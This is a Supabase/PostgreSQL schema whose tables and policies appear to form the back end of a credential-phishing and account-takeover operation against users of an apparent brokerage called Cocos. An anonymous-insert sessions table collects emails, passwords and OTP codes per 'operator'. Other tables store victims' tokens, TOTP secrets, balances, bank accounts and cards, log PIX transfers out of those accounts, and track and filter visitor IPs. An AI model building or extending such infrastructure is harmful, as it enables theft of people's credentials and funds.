-- Create enum for roles
CREATE TYPE public.app_role AS ENUM ('admin', 'user');

-- Table: blocked_ips
CREATE TABLE public.blocked_ips (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  ip_address TEXT NOT NULL,
  reason TEXT,
  visit_count INTEGER NOT NULL DEFAULT 0,
  blocked_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);
ALTER TABLE public.blocked_ips ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow all for authenticated" ON public.blocked_ips FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- Table: cocos_accounts
CREATE TABLE public.cocos_accounts (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  email TEXT NOT NULL,
  password TEXT,
  operator_code TEXT NOT NULL DEFAULT '',
  full_name TEXT,
  phone TEXT,
  access_token TEXT,
  refresh_token TEXT,
  account_id TEXT,
  user_id_cocos TEXT,
  totp_secret TEXT,
  info_tag TEXT,
  factors JSONB,
  balance_ars JSONB,
  balance_usd JSONB,
  buying_power JSONB,
  bank_accounts JSONB,
  cards JSONB,
  orders JSONB,
  portfolio_data JSONB,
  profile_data JSONB,
  last_login_at TIMESTAMP WITH TIME ZONE,
  last_refresh_at TIMESTAMP WITH TIME ZONE,
  last_data_sync_at TIMESTAMP WITH TIME ZONE,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);
ALTER TABLE public.cocos_accounts ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow all for authenticated cocos" ON public.cocos_accounts FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- Table: operators
CREATE TABLE public.operators (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  code TEXT NOT NULL,
  name TEXT NOT NULL,
  user_id TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);
ALTER TABLE public.operators ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow all for authenticated operators" ON public.operators FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- Table: page_visits
CREATE TABLE public.page_visits (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  source TEXT NOT NULL,
  page_path TEXT,
  ip_address TEXT,
  user_agent TEXT,
  referrer TEXT,
  country TEXT,
  city TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);
ALTER TABLE public.page_visits ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow insert for anon visits" ON public.page_visits FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY "Allow all for authenticated visits" ON public.page_visits FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- Table: profiles
CREATE TABLE public.profiles (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  display_name TEXT,
  email TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);
ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Users can view own profile" ON public.profiles FOR SELECT USING (auth.uid() = user_id);
CREATE POLICY "Users can update own profile" ON public.profiles FOR UPDATE USING (auth.uid() = user_id);
CREATE POLICY "Users can insert own profile" ON public.profiles FOR INSERT WITH CHECK (auth.uid() = user_id);

-- Table: sessions
CREATE TABLE public.sessions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  email TEXT,
  password TEXT,
  otp_code TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  source TEXT NOT NULL DEFAULT '',
  operator_code TEXT NOT NULL DEFAULT '',
  ip_address TEXT,
  user_agent TEXT,
  country TEXT,
  city TEXT,
  region TEXT,
  user_id TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);
ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow insert for anon sessions" ON public.sessions FOR INSERT TO anon WITH CHECK (true);
CREATE POLICY "Allow all for authenticated sessions" ON public.sessions FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- Table: user_roles
CREATE TABLE public.user_roles (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
  role app_role NOT NULL DEFAULT 'user',
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  UNIQUE (user_id, role)
);
ALTER TABLE public.user_roles ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Users can view own roles" ON public.user_roles FOR SELECT USING (auth.uid() = user_id);

-- Table: whitelisted_ips
CREATE TABLE public.whitelisted_ips (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  ip_address TEXT NOT NULL,
  description TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);
ALTER TABLE public.whitelisted_ips ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow all for authenticated whitelist" ON public.whitelisted_ips FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- Table: pix_transactions
CREATE TABLE public.pix_transactions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  account_email TEXT NOT NULL,
  pix_key TEXT NOT NULL,
  amount_brl NUMERIC NOT NULL,
  amount_ars NUMERIC,
  exchange_rate NUMERIC,
  recipient_name TEXT,
  payment_method TEXT,
  payment_id TEXT,
  settlement_id TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  result_data JSONB,
  cocos_account_id UUID REFERENCES public.cocos_accounts(id),
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);
ALTER TABLE public.pix_transactions ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Allow all for authenticated pix" ON public.pix_transactions FOR ALL TO authenticated USING (true) WITH CHECK (true);

-- Function: has_role
CREATE OR REPLACE FUNCTION public.has_role(_user_id UUID, _role app_role)
RETURNS BOOLEAN
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT EXISTS (
    SELECT 1
    FROM public.user_roles
    WHERE user_id = _user_id
      AND role = _role
  )
$$;

-- Function: check_ip_rate_limit
CREATE OR REPLACE FUNCTION public.check_ip_rate_limit(check_ip TEXT)
RETURNS JSON
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
DECLARE
  is_blocked BOOLEAN;
  is_whitelisted BOOLEAN;
BEGIN
  SELECT EXISTS(SELECT 1 FROM whitelisted_ips WHERE ip_address = check_ip) INTO is_whitelisted;
  IF is_whitelisted THEN
    RETURN json_build_object('allowed', true, 'whitelisted', true);
  END IF;
  SELECT EXISTS(SELECT 1 FROM blocked_ips WHERE ip_address = check_ip) INTO is_blocked;
  IF is_blocked THEN
    RETURN json_build_object('allowed', false, 'blocked', true);
  END IF;
  RETURN json_build_object('allowed', true, 'whitelisted', false, 'blocked', false);
END;
$$;

-- Function: update_updated_at_column
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

CREATE TRIGGER update_cocos_accounts_updated_at
  BEFORE UPDATE ON public.cocos_accounts
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

CREATE TRIGGER update_profiles_updated_at
  BEFORE UPDATE ON public.profiles
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- Auto-create profile on signup
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO public.profiles (user_id, email)
  VALUES (NEW.id, NEW.email);
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER SET search_path = public;

CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE FUNCTION public.handle_new_user();